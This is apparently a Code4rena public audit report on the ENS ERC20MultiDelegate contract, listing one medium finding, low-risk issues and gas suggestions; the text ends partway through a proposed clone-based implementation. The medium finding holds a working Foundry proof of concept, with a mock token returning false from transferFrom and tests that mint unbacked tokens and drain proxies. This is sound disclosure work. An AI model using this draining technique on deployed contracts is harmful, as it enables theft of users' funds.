---
sponsor: "ENS"
slug: "2023-10-ens"
date: "2023-12-04"
title: "ENS"
findings: "https://github.com/code-423n4/2023-10-ens-findings/issues"
contest: 294
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the ENS smart contract system written in Solidity. The audit took place between October 5 — October 11, 2023.

## Wardens

57 Wardens contributed reports to ENS:

  1. [Dravee](https://code4rena.com/@Dravee)
  2. [thekmj](https://code4rena.com/@thekmj)
  3. [J4X](https://code4rena.com/@J4X)
  4. [peakbolt](https://code4rena.com/@peakbolt)
  5. [jnforja](https://code4rena.com/@jnforja)
  6. [nirlin](https://code4rena.com/@nirlin)
  7. [squeaky\_cactus](https://code4rena.com/@squeaky_cactus)
  8. [xAriextz](https://code4rena.com/@xAriextz)
  9. [Shogoki](https://code4rena.com/@Shogoki)
  10. [radev\_sw](https://code4rena.com/@radev_sw)
  11. [polarzero](https://code4rena.com/@polarzero)
  12. [windhustler](https://code4rena.com/@windhustler)
  13. [MrPotatoMagic](https://code4rena.com/@MrPotatoMagic)
  14. [d3e4](https://code4rena.com/@d3e4)
  15. [Sathish9098](https://code4rena.com/@Sathish9098)
  16. [0xSmartContract](https://code4rena.com/@0xSmartContract)
  17. [rahul](https://code4rena.com/@rahul)
  18. [ihtishamsudo](https://code4rena.com/@ihtishamsudo)
  19. [marchev](https://code4rena.com/@marchev)
  20. [pfapostol](https://code4rena.com/@pfapostol)
  21. [lukejohn](https://code4rena.com/@lukejohn)
  22. [0xhex](https://code4rena.com/@0xhex)
  23. [SovaSlava](https://code4rena.com/@SovaSlava)
  24. [aslanbek](https://code4rena.com/@aslanbek)
  25. [0x3b](https://code4rena.com/@0x3b)
  26. [Maroutis](https://code4rena.com/@Maroutis)
  27. [MiloTruck](https://code4rena.com/@MiloTruck)
  28. [SBSecurity](https://code4rena.com/@SBSecurity) ([Slavcheww](https://code4rena.com/@Slavcheww) and [Blckhv](https://code4rena.com/@Blckhv))
  29. [Limbooo](https://code4rena.com/@Limbooo)
  30. [hyh](https://code4rena.com/@hyh)
  31. [ro1sharkm](https://code4rena.com/@ro1sharkm)
  32. [inzinko](https://code4rena.com/@inzinko)
  33. [Bulletprime](https://code4rena.com/@Bulletprime)
  34. [asui](https://code4rena.com/@asui)
  35. [0xnev](https://code4rena.com/@0xnev)
  36. [ABA](https://code4rena.com/@ABA)
  37. [SY\_S](https://code4rena.com/@SY_S)
  38. [SAQ](https://code4rena.com/@SAQ)
  39. [0xta](https://code4rena.com/@0xta)
  40. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  41. [JCK](https://code4rena.com/@JCK)
  42. [MatricksDeCoder](https://code4rena.com/@MatricksDeCoder)
  43. [danb](https://code4rena.com/@danb)
  44. [K42](https://code4rena.com/@K42)
  45. [Chom](https://code4rena.com/@Chom)
  46. [adriro](https://code4rena.com/@adriro)
  47. [nmirchev8](https://code4rena.com/@nmirchev8)
  48. [33BYTEZZZ](https://code4rena.com/@33BYTEZZZ) ([33audits](https://code4rena.com/@33audits), [hexbyte](https://code4rena.com/@hexbyte) and [zuhaibmohd](https://code4rena.com/@zuhaibmohd))
  49. [btk](https://code4rena.com/@btk)
  50. [adam-idarrha](https://code4rena.com/@adam-idarrha)
  51. [Bauchibred](https://code4rena.com/@Bauchibred)
  52. [rvierdiiev](https://code4rena.com/@rvierdiiev)
  53. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  54. [Tadev](https://code4rena.com/@Tadev)

This audit was judged by [hansfriese](https://code4rena.com/@hansfriese).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 1 unique vulnerabilities. Of these vulnerabilities, 0 received a risk rating in the category of HIGH severity and 1 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 24 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 15 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 ENS repository](https://github.com/code-423n4/2023-10-ens), and is composed of 1 smart contract written in the Solidity programming language and includes 216 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **henry** from warden hihen, generated the [Automated Findings report](https://gist.github.com/code423n4/33c1c8dad584e9eba48c38c69495fb59) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# Medium Risk Findings (1)
## [[M-01] Some tokens enable the direct draining of all approved `ERC20Votes` tokens](https://github.com/code-423n4/2023-10-ens-findings/issues/91)
*Submitted by [Dravee](https://github.com/code-423n4/2023-10-ens-findings/issues/91), also found by [thekmj](https://github.com/code-423n4/2023-10-ens-findings/issues/691), [jnforja](https://github.com/code-423n4/2023-10-ens-findings/issues/608), [nirlin](https://github.com/code-423n4/2023-10-ens-findings/issues/374), [squeaky\_cactus](https://github.com/code-423n4/2023-10-ens-findings/issues/365), [xAriextz](https://github.com/code-423n4/2023-10-ens-findings/issues/313), [peakbolt](https://github.com/code-423n4/2023-10-ens-findings/issues/299), [Shogoki](https://github.com/code-423n4/2023-10-ens-findings/issues/153), and [J4X](https://github.com/code-423n4/2023-10-ens-findings/issues/140)*

### Lines of code

<https://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L148><br>
<https://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L160><br>
<https://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L170><br>
<https://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L101-L115>

### Vulnerability details

There's an appropriately invalidated finding found by the bots during the bot race about the [unsafe use of `transferFrom` on non-standard ERC20 tokens](https://github.com/code-423n4/2023-10-ens/blob/main/bot-report.md#d24-unsafe-use-of-erc20-transfertransferfrom). The finding is mostly invalid because, here, we're using `ERC20Votes` tokens, not `ERC20` ones; hence the mentioned tokens like USDT aren't good arguments.

I would like to argue, however, that the recommendation that would've been true here would be to wrap the `transferFrom` calls in a `require` statement, as the `transferFrom` functions used in `ERC20Votes` are still from the inherited `ERC20` interface and therefore could be returning a boolean (`transferFrom(address from, address to, uint256 amount) returns bool`, see [OpenZeppelin's implementation](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20-transferFrom-address-address-uint256-)), instead of reverting, depending on the existence of such an `ERC20Votes` token. The assumption of an `ERC20Votes` token returning `true` or `false` instead of reverting will be used in this argumentation and be considered a possibility; especially since the list of potential `ERC20Votes token`s used by this contract isn't specified (`ENSToken` isn't enforced). Also, see [these posts](https://discord.com/channels/810916927919620096/1159158237325697166/1160653235703521451) from the Discord channel:

> Question by J4X — Hey @nickjohnson, are we correct to assume that this will only be deployed on ethereum?
> 
> Answer by nickjohnson — By us, yes, but consider the goal of the audit to be against any wrapped erc20votes token, not just `$`ens.

**About this finding:**

This finding is the second one in a series of 2 findings using a similar set of arguments, but the first is used here as a chain:

1. Some tokens break accounting by enabling the free minting of `ERC20MultiDelegate` tokens.
2. Some tokens enable the direct draining of all approved `ERC20Votes` tokens.

Some parts are similar between the two findings, but because they each deserved their own analysis and "should fix" - argumentation, they are submitted as separate findings.

### Impact

Draining all `ERC20Votes` tokens.

### Proof of Concept

**Starting assumptions:**

The `token` used as `ERC20Votes` returns the boolean `false` with `transferFrom` instead of reverting (not very likely implementation but still a possible and damaging edge case).

**MockERC20Votes contract:**

The following `test/mocks/MockERC20Votes.sol` file is a simplified `ERC20Votes` token that wraps the original `transferFrom()` function to return a `bool` instead of reverting:

```solidity
pragma solidity ^0.8.2;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";
import "forge-std/console.sol";

contract MockERC20Votes is ERC20, ERC20Votes {
    constructor()
        ERC20("MockERC20Votes", "MOCK")
        ERC20Permit("MockERC20Votes")
    {
        _mint(msg.sender, 1e30);
    }

    function superTransferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        return super.transferFrom(sender, recipient, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        (bool success, bytes memory data) = address(this).delegatecall(
            abi.encodeCall(
                MockERC20Votes.superTransferFrom,
                (sender, recipient, amount)
            )
        );

        console.log("success: ", success);

        return success;
    }

    // The following functions are overrides required by Solidity.

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override(ERC20, ERC20Votes) {
        super._afterTokenTransfer(from, to, amount);
    }

    function _mint(
        address to,
        uint256 amount
    ) internal override(ERC20, ERC20Votes) {
        super._mint(to, amount);
    }

    function _burn(
        address account,
        uint256 amount
    ) internal override(ERC20, ERC20Votes) {
        super._burn(account, amount);
    }
}
```

The tests `test_transferFromReturningTrue` and `test_transferFromReturningFalse` are provided to showcase an example implementation of an `ERC20Votes` token that, instead of reverting, would return a boolean `success == false`. The reason for such a token's existence won't be discussed, as the sheer possibility of its existence is the only argument that is of interest to us (and demands from customers are sometimes surprising). As yet again another reminder: the "standard" is still respected in this argumentation.

**Foundry Setup:**

Add `require("@nomicfoundation/hardhat-foundry")` in `hardhat.config.js` and run this to be able to run the POC:

```
npm install --save-dev @nomicfoundation/hardhat-foundry
npx hardhat init-foundry
```

**Test contract:**

1. Create a `test/delegatemulti.t.sol` file containing the code below and focus on `test_directDraining()`:

<details>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.2;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "test/mocks/MockERC20Votes.sol";
import "contracts/ERC20MultiDelegate.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

contract DelegateCallTest is IERC1155Receiver, Test {
    address alice = makeAddr("Alice");
    address bob = makeAddr("Bob");
    MockERC20Votes votesToken;
    ERC20MultiDelegate delegateToken;
    address proxyAddress1;
    address proxyAddress2;
    address proxyAddress3;

    function setUp() public {
        // Deploying the tokens
        votesToken = new MockERC20Votes();
        delegateToken = new ERC20MultiDelegate(
            votesToken,
            "https://code4rena.com/"
        );

        // Giving some votesToken to Alice and Bob
        votesToken.transfer(alice, 5);
        votesToken.transfer(bob, 4);

        // Initializing the ERC20MultiDelegate token with the first delegateMulti call
        uint256[] memory initialSources; // No sources initially, just creating proxies and transferring votesToken
        uint256[] memory initialTargets = new uint256[](3);
        initialTargets[0] = 1;
        initialTargets[1] = 2;
        initialTargets[2] = 3;
        uint256[] memory initialAmounts = new uint256[](3);
        initialAmounts[0] = 0;
        initialAmounts[1] = 10;
        initialAmounts[2] = 20;
        votesToken.approve(address(delegateToken), type(uint256).max);
        delegateToken.delegateMulti(
            initialSources,
            initialTargets,
            initialAmounts
        );
        proxyAddress1 = retrieveProxyContractAddress(address(uint160(1)));
        proxyAddress2 = retrieveProxyContractAddress(address(uint160(2)));
        proxyAddress3 = retrieveProxyContractAddress(address(uint160(3)));

        // Making sure that the deployer's balance of ERC20MultiDelegate tokens matches the deployed proxies' balance.
        assertEq(
            votesToken.balanceOf(proxyAddress1),
            delegateToken.balanceOf(address(this), 1)
        );
        assertEq(
            votesToken.balanceOf(proxyAddress2),
            delegateToken.balanceOf(address(this), 2)
        );
        assertEq(
            votesToken.balanceOf(proxyAddress3),
            delegateToken.balanceOf(address(this), 3)
        );

        // Alice approving ERC20MultiDelegate for her ERC20Votes tokens
        vm.prank(alice);
        votesToken.approve(address(delegateToken), type(uint256).max);
    }

    // Bug 1: Some tokens break accounting by enabling the free minting of `ERC20MultiDelegate` tokens
    function test_freeMinting() public {
        /* Showing the initial conditions through asserts */
        // proxyAddress1 has 0 votesToken
        assertEq(votesToken.balanceOf(proxyAddress1), 0);
        // Alice has 5 voteTokens
        assertEq(votesToken.balanceOf(alice), 5);
        // Alice has 0 ERC20MultiDelegate tokens for ID(1)
        assertEq(delegateToken.balanceOf(alice, 1), 0);

        /* Begin minting for free */
        vm.startPrank(alice);
        uint256[] memory sources;
        // Alice is targeting existing and non-existing proxies
        uint256[] memory targets = new uint256[](7);
        targets[0] = 1;
        targets[1] = 2;
        targets[2] = 3;
        targets[3] = 4;
        targets[4] = 5;
        targets[5] = 6;
        targets[6] = 7;
        // Alice is using an arbitrary amount, exceeding the proxies' balances
        uint256[] memory amounts = new uint256[](7);
        amounts[0] = 100;
        amounts[1] = 100;
        amounts[2] = 100;
        amounts[3] = 100;
        amounts[4] = 100;
        amounts[5] = 100;
        amounts[6] = 100;
        // Making the call, not reverting
        delegateToken.delegateMulti(sources, targets, amounts);
        vm.stopPrank();

        /* Showing the final balances */
        // There still aren't any ERC20Votes balance for proxyAddress1
        assertEq(votesToken.balanceOf(proxyAddress1), 0);
        // Alice's ERC20Votes balance stayed the same
        assertEq(votesToken.balanceOf(alice), 5);
        // However, ERC20MultiDelegate balances for IDs between 1 and 7 increased for Alice, effectively breaking accounting
        assertEq(delegateToken.balanceOf(alice, 1), 100);
        assertEq(delegateToken.balanceOf(alice, 2), 100);
        assertEq(delegateToken.balanceOf(alice, 3), 100);
        assertEq(delegateToken.balanceOf(alice, 4), 100);
        assertEq(delegateToken.balanceOf(alice, 5), 100);
        assertEq(delegateToken.balanceOf(alice, 6), 100);
        assertEq(delegateToken.balanceOf(alice, 7), 100);
    }

    // Bug 2: Some tokens enable the direct draining of all approved `ERC20Votes` tokens
    function test_directDraining() public {
        /* Showing the initial conditions through asserts */
        // Proxies' votesToken balance
        assertEq(votesToken.balanceOf(proxyAddress1), 0);
        assertEq(votesToken.balanceOf(proxyAddress2), 10);
        assertEq(votesToken.balanceOf(proxyAddress3), 20);
        // Alice's votesToken balance (from setUp())
        assertEq(votesToken.balanceOf(alice), 5);
        // Alice's delegateToken balance for each ID is initially 0
        assertEq(delegateToken.balanceOf(alice, 1), 0);
        assertEq(delegateToken.balanceOf(alice, 2), 0);
        assertEq(delegateToken.balanceOf(alice, 3), 0);

        /* Begin minting for free */
        vm.startPrank(alice);
        uint256[] memory sourcesStep1;
        uint256[] memory targetsStep1 = new uint256[](3);
        targetsStep1[0] = 1;
        targetsStep1[1] = 2;
        targetsStep1[2] = 3;
        uint256[] memory amountsStep1 = new uint256[](3);
        amountsStep1[0] = 100;
        amountsStep1[1] = 100;
        amountsStep1[2] = 100;
        delegateToken.delegateMulti(sourcesStep1, targetsStep1, amountsStep1);
        assertEq(delegateToken.balanceOf(alice, 1), 100);
        assertEq(delegateToken.balanceOf(alice, 2), 100);
        assertEq(delegateToken.balanceOf(alice, 3), 100);

        /* Using newly-minted amounts to drain proxies */
        uint256[] memory targetsStep2;
        uint256[] memory sourcesStep2 = new uint256[](3);
        sourcesStep2[0] = 1;
        sourcesStep2[1] = 2;
        sourcesStep2[2] = 3;
        uint256[] memory amountsStep2 = new uint256[](3);
        amountsStep2[0] = 0;
        amountsStep2[1] = 10;
        amountsStep2[2] = 20;
        delegateToken.delegateMulti(sourcesStep2, targetsStep2, amountsStep2);

        /* Showing the final balances */

        // Proxies are drained
        assertEq(votesToken.balanceOf(proxyAddress1), 0);
        assertEq(votesToken.balanceOf(proxyAddress2), 0);
        assertEq(votesToken.balanceOf(proxyAddress3), 0);

        // Alice's votesToken balance is now "InitialBalance + balances from proxies"
        assertEq(votesToken.balanceOf(alice), 5 + 10 + 20);

        // Alice really did use her fake ERC20MultiDelegate balance
        assertEq(delegateToken.balanceOf(alice, 1), 100);
        assertEq(delegateToken.balanceOf(alice, 2), 90);
        assertEq(delegateToken.balanceOf(alice, 3), 80);

        vm.stopPrank();
    }

    /** BELOW ARE JUST UTILITIES */

    // Making sure that the MockERC20Votes returns false instead of reverting on failure for transferFrom
    function test_transferFromReturningFalse() public {
        // If you don't approve yourself, transferFrom won't be directly callable
        vm.prank(bob);
        bool success = votesToken.transferFrom(alice, bob, 5);
        assertEq(success, false);
    }

    // Making sure that the MockERC20Votes returns true on success for transferFrom
    function test_transferFromReturningTrue() public {
        // There's a need to approve yourself for a direct call to transferFrom(), surprisingly
        vm.startPrank(alice);
        votesToken.approve(alice, type(uint256).max);
        bool success = votesToken.transferFrom(alice, bob, 5);
        vm.stopPrank();
        assertEq(success, true);
    }

    // copy-pasting and adapting ERC20MultiDelegate.retrieveProxyContractAddress
    function retrieveProxyContractAddress(
        address _delegate
    ) private view returns (address) {
        bytes memory bytecode = abi.encodePacked(
            type(ERC20ProxyDelegator).creationCode,
            abi.encode(votesToken, _delegate)
        );
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(delegateToken),
                uint256(0), // salt
                keccak256(bytecode)
            )
        );
        return address(uint160(uint256(hash)));
    }

    // No need to read below (IERC1155Receiver implementation)
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        return IERC1155Receiver.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4) {
        return IERC1155Receiver.onERC1155BatchReceived.selector;
    }

    // ERC165 interface support
    function supportsInterface(
        bytes4 interfaceID
    ) external view returns (bool) {
        return
            interfaceID == 0x01ffc9a7 || // ERC165
            interfaceID == 0x4e2312e0; // ERC1155_ACCEPTED ^ ERC1155_BATCH_ACCEPTED;
    }
}
```

</details>


2.  Run the test with `forge test --mt test_directDraining` and see this test passing.

**Here's the layout of what's happening (the first 3 steps are like "`Bug1: test_freeMinting`"):**

1. Initially, Alice owns some `ERC20Votes` tokens (`5`) but no `ERC20MultiDelegate` tokens.
2. Alice calls `delegateMulti()` by targeting existing IDs on `ERC20MultiDelegate` and inputting `amount == 100` for each of them.
3. The lack of revert (as a reminder, the `transferFrom()` function in this example returns a boolean) makes it that the silent failure enables Alice to mint any amount on any ID on `ERC20MultiDelegate`.
4. Alice can now use their newly minted balance of `ERC20MultiDelegate` tokens by calling `delegateMulti()`, with this time the deployed proxy contracts as `source`s.
5. All `ERC20Votes` tokens got drained from all deployed proxies and were transferred to Alice.

Here, we're both breaking accounting (bug1) and taking advantage of approved funds to the main contract by the deployed proxies to drain all `ERC20Votes` tokens.

Again, this contract's security shouldn't depend on the behavior of an external `ERC20Votes` contract (it leaves vectors open). Hence, this is a "should fix" bug, meaning at least Medium severity. The token-draining part makes an argument for a higher severity.

### Remediation

While wrapping the `transferFrom()` statements in a `require` statement is a good idea that was suggested in the previous bug, it would also be advisable to try and enforce an invariant by checking for the `source`'s balance inside `_reimburse()`, just like it is done inside `_processDelegation()`. Albeit, it's for the `ERC20MultiDelegate`'s internal balance, and not `ERC20Votes`'s external balance check. The principle still holds and adding a check would increase security. Note that, while the existing `assert()` can be sidestepped, and this is detailed in another finding, it wouldn't be the case with `ERC20Votes`'s external balance due to the immediate transfer.

### Assessed type

Token-Transfer

**[141345 (lookout) commented](https://github.com/code-423n4/2023-10-ens-findings/issues/91#issuecomment-1759034335):**
 > return false of `transferFrom()`.
> 
> From [eip-20](https://eips.ethereum.org/EIPS/eip-20):
> > Callers MUST handle false from returns (bool success). Callers MUST NOT assume that false is never returned!
> 
> Tokens should comply with `ERC20votes` standard, but reverting on failure is not ERC20 standard.

**[Arachnid (ENS) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-ens-findings/issues/91#issuecomment-1763944543):**
 > Agreed this is a valid issue - to be ERC20 compliant we must check the return value. Given the low likelihood, most token implementations and all known implementations of ERC20Votes revert - I would argue this should be rated as Medium.


**[hansfriese (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-ens-findings/issues/91#issuecomment-1775087374):**
 > Medium severity is appropriate with the low likelihood.

*Note: for full discussion, see [here](https://github.com/code-423n4/2023-10-ens-findings/issues/91).*

***

# Low Risk and Non-Critical Issues

For this audit, 24 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-10-ens-findings/issues/272) by **thekmj** received the top score from the judge.

*The following wardens also submitted reports: [Maroutis](https://github.com/code-423n4/2023-10-ens-findings/issues/590), [J4X](https://github.com/code-423n4/2023-10-ens-findings/issues/424), [MiloTruck](https://github.com/code-423n4/2023-10-ens-findings/issues/174), [0x3b](https://github.com/code-423n4/2023-10-ens-findings/issues/122), [radev\_sw](https://github.com/code-423n4/2023-10-ens-findings/issues/100), [Dravee](https://github.com/code-423n4/2023-10-ens-findings/issues/90), [SBSecurity](https://github.com/code-423n4/2023-10-ens-findings/issues/623), [Chom](https://github.com/code-423n4/2023-10-ens-findings/issues/582), [adriro](https://github.com/code-423n4/2023-10-ens-findings/issues/508), [nmirchev8](https://github.com/code-423n4/2023-10-ens-findings/issues/482), [33BYTEZZZ](https://github.com/code-423n4/2023-10-ens-findings/issues/460), [btk](https://github.com/code-423n4/2023-10-ens-findings/issues/458), [Limbooo](https://github.com/code-423n4/2023-10-ens-findings/issues/432), [Sathish9098](https://github.com/code-423n4/2023-10-ens-findings/issues/400), [adam-idarrha](https://github.com/code-423n4/2023-10-ens-findings/issues/399), [Bauchibred](https://github.com/code-423n4/2023-10-ens-findings/issues/383), [rvierdiiev](https://github.com/code-423n4/2023-10-ens-findings/issues/367), [hyh](https://github.com/code-423n4/2023-10-ens-findings/issues/335), [peakbolt](https://github.com/code-423n4/2023-10-ens-findings/issues/302), [MrPotatoMagic](https://github.com/code-423n4/2023-10-ens-findings/issues/266), [ZanyBonzy](https://github.com/code-423n4/2023-10-ens-findings/issues/208), [Tadev](https://github.com/code-423n4/2023-10-ens-findings/issues/112), and [lukejohn](https://github.com/code-423n4/2023-10-ens-findings/issues/32).*

## [L-01] `assert()` does not provide any information when thrown.

*This finding escalates **[N-09]** of the automated report.*

https://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L131

The following assertion will throw when the user attempts to re-delegate more than the existing amount. Using `assert` here has the following two issues:
1. `assert` does not provide any error message when thrown, while it should have been reported told as an `Insufficient balance` error message or similar.
2. Even if the condition passes, the tx is guaranteed to fail at the `_burnBatch` call anyway, as the owner would not have enough ERC1155 to burn.

We suggest changing `assert` to a `require` statement, with a clear error message, or using custom errors.

## [L-02] ERC1155 can be inflated if the token doesn't revert on failed transfer

While the only ERC20 token that the contract interacts with is the designated token with voting capability, if the token does not revert on failed transfer (e.g. transfer exceeds balance), then anyone can infinitely mint the ERC1155 token. This can be extended into a honeypot attack vector that can steal funds from successful transfers.

**POC**:
- Alice doesn't own any tokens.
- Alice can mint ERC1155 for some delegate for free by using `delegateMulti`.
- Bob mints ERC1155 for the same delegate, using their tokens.
- Alice burns their ERC1155, stealing Bob's tokens.

Alice can be aware of Bob's delegatee by simply front-running.

We recognize this as a low severity issue because, while the impact is high, we could not identify such a token with both voting capability and doesn't revert on failed transfer. However, we do not rule out the possibility that such a token does exist.

The recommended mitigation method is to use OpenZeppelin's `safeTransfer`.

## [L-03] OpenZeppelin's ERC1155 forces contract recipients to implement `onERC115Received`

The ERC721 token, closely related to ERC1155, has a `_safeMint` mechanism, where a contract recipient must implement `onERC721Received` to receive the minted NFT, otherwise, the call will revert. This is to ensure that contract NFTs cannot be stuck in smart contracts.

However, in OpenZeppelin's ERC1155, the function [`_mintBatch()`](https://github.com/code-423n4/2023-10-ens/blob/main/contracts/ERC20MultiDelegate.sol#L114) requires that a contract user [must be able to accept the token](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC1155/ERC1155.sol#L321), that is, it implements the ERC721-like safe mint mechanism by default.

This brings forth an edge case where contract recipients (e.g. multisigs) may fail to delegate due to not being able to accept the token. We urge the sponsor to double check on whether this is the intended mechanism.

## [S-01] Tokenizing vote delegation is a new idea. User should be notified/contract should be documented to prevent transferring away their ERC1155

The `ERC20MultiDelegate` splits delegation by wrapping ENS, and tokenizing it into an ERC1155, with the ID being the delegatee. We note some of the behaviors that we, as a user, may not expect it to have:
- In the `ERC20MultiDelegate` ERC1155, transferring the token retains the voting power to the current delegatee.
    - In the vanilla ERC20Votes, transferring away ERC20 tokens also transfers away the voting power (i.e. if Alice transfers tokens to Bob, then Alice's delegatee's voting power is transferred to Bob's delegatee).
- ERC1155 is a transferrable token. However, transferring away `ERC20MultiDelegate` is equivalent to transferring away ENS. The token may show up on block explorers such as etherscan, and users may attempt to transfer it away, losing their funds as a result.
    - This can be achieved by social engineering or other non-blockchain attacks.

These are some behaviors of the token that we find, while logically sound, should not be unexpected for a user to deduce at first usage. Users should be made aware of the vote tokenizing mechanism to prevent accidentally losing funds.

## [N-01] Documentation should mention minting of ERC1155 when calling `delegateMulti()`

When `delegateMulti()` is called, ERC1155 tokens may be minted. However, following ERC1155 standards, the recipient must either be an EOA, or a contract implementing `ERC1155Holder`, or the tx will revert.

While this should be the correct and intended behavior, the fact that ERC1155 is minted is not documented in the function. This may cause unintended reverts to e.g. multisigs, or other interacting contracts.

## [N-02] `delegateMulti()` should be protected with a reentrancy guard.

The function `delegateMulti()` may mint ERC1155 tokens, which in turn may invoke a `onERC1155Received()` at the recipient (if it is a contract). This opens up potential for reentrancy.

While we evaluated that the function correctly follows the CEI pattern and did not identify a potential attack vector, we do believe a proper reentrancy guard in place is good practice. 

## [N-03] `_reimburse()` docs are slightly inconsistent with its behavior

The docs for function `_reimburse()` mentions:

```solidity
/**
 * @dev Reimburses any remaining source amounts back to the delegator after the delegation transfer process.
 * @param source The source delegate from which tokens are being withdrawn.
 * @param amount The amount of tokens to be withdrawn from the source delegate.
 */
// ...

// Transfer the remaining source amount or the full source amount
// (if no remaining amount) to the delegator
```

However, the function always (attempts to) transfers exactly `amount`, which should be specified as a function parameter earlier in the `delegateMulti()` call. This is inconsistent with the documentation

## [N-04] Contract name is misleading

The contract name is `ERC20MultiDelegate`, strongly implies it is an ERC20 token. Such naming can cause confusion, as:
- It is not an ERC20 token, but rather an ERC1155.
- It acts as a wrapper for any standard ERC20Votes, enabling multiple delegations, but cannot be a standalone token by itself.

We suggest a more descriptive name, such as `ERC20VotesMultiDelegateWrapper`.

**[Arachnid (ENS) confirmed and commented](https://github.com/code-423n4/2023-10-ens-findings/issues/272#issuecomment-1764142628):**
 > Agree except N-02; reentrancy guards are a bandaid for poorly written code, and using one here would waste gas.

**[hansfriese (judge) commented](https://github.com/code-423n4/2023-10-ens-findings/issues/272#issuecomment-1779767853):**
> [L-02] - Medium<br>
> [S-01] - Non-critical 

***

# Gas Optimizations

For this audit, 15 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2023-10-ens-findings/issues/409) by **windhustler** received the top score from the judge.

*The following wardens also submitted reports: [0xhex](https://github.com/code-423n4/2023-10-ens-findings/issues/407), [SovaSlava](https://github.com/code-423n4/2023-10-ens-findings/issues/187), [lukejohn](https://github.com/code-423n4/2023-10-ens-findings/issues/23), [aslanbek](https://github.com/code-423n4/2023-10-ens-findings/issues/15), [SY\_S](https://github.com/code-423n4/2023-10-ens-findings/issues/658), [d3e4](https://github.com/code-423n4/2023-10-ens-findings/issues/630), [SAQ](https://github.com/code-423n4/2023-10-ens-findings/issues/522), [0xta](https://github.com/code-423n4/2023-10-ens-findings/issues/423), [MrPotatoMagic](https://github.com/code-423n4/2023-10-ens-findings/issues/304), [hunter\_w3b](https://github.com/code-423n4/2023-10-ens-findings/issues/292), [JCK](https://github.com/code-423n4/2023-10-ens-findings/issues/222), [MatricksDeCoder](https://github.com/code-423n4/2023-10-ens-findings/issues/142), [danb](https://github.com/code-423n4/2023-10-ens-findings/issues/66), and [K42](https://github.com/code-423n4/2023-10-ens-findings/issues/50).*

## Utilize ERC-1167 to save gas on deployment and address retrieval for each user
The current design deploys a new `ERC20ProxyDelegator` using CREATE2 for each user that receives ERC115 tokens or voting shares. Moreover, the `ERC20ProxyDelegator` doesn't have any runtime code and is only deployed once. 
As contract creation is one of the most gas-expensive operations, this can be heavily optimized by using the [`ERC-1167` standard](https://eips.ethereum.org/EIPS/eip-1167). As this requires several changes, I will be providing a new implementation (below) and a test file that proves the gas savings.

<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import "@openzeppelin/access/Ownable.sol";
import "@openzeppelin/token/ERC1155/ERC1155.sol";
import "@openzeppelin/token/ERC20/extensions/ERC20Votes.sol";
import "@openzeppelin/utils/math/Math.sol";

import "@openzeppelin/proxy/Clones.sol";

contract ERC20ProxyDelegatorImplementation {
    ERC20Votes internal immutable token;
    address internal immutable owner;

    constructor(ERC20Votes _token) {
        token = _token;
        owner = msg.sender;
    }

    function initialize(address _delegate) external {
        require(msg.sender == owner);
        token.delegate(_delegate);
        token.approve(msg.sender, type(uint256).max);
    }
}

contract ERC20MultiDelegateProxyClones is ERC1155, Ownable {
    using Clones for address;

    ERC20Votes public token;
    ERC20ProxyDelegatorImplementation public immutable proxyDelegator;

    /**
     * ### EVENTS ###
     */

    event ProxyDeployed(address indexed delegate, address proxyAddress);
    event DelegationProcessed(address indexed from, address indexed to, uint256 amount);

    /**
     * @dev Constructor.
     * @param _token The ERC20 token address
     * @param _metadata_uri ERC1155 metadata uri
     */
    constructor(ERC20Votes _token, string memory _metadata_uri) ERC1155(_metadata_uri) {
        token = _token;
        proxyDelegator = new ERC20ProxyDelegatorImplementation(_token);
    }

    /**
